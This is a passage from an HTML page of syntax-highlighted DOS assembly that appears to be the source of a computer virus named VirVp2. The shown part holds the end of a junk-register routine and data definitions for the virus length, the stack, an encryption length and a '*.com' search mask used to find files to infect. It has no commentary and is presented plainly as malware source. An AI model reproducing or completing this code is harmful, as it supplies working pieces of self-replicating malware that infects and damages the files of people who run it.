    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetFrR</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">LoadReg</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">@LoopRM</span><span class="sc0">
</span><span class="sc5">@ExitRM</span><span class="sc4">:</span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Reg_Musor</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Mask_Com</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">Save_Byte</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">Shifr_Lenght</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">Shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">Shl</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">StrVp</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'V+'</span><span class="sc0">

</span><span class="sc5">Vir_Lenght</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Vir_Stack</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">800h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Save_Dta2</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Save_Sp</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Save_Ss</span><span class="sc0">     </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RndZn</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">New_DTA</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">Vir_Lenght</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
    </span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">VirVp2</span><span class="sc0">
</span></div></body>
</html>
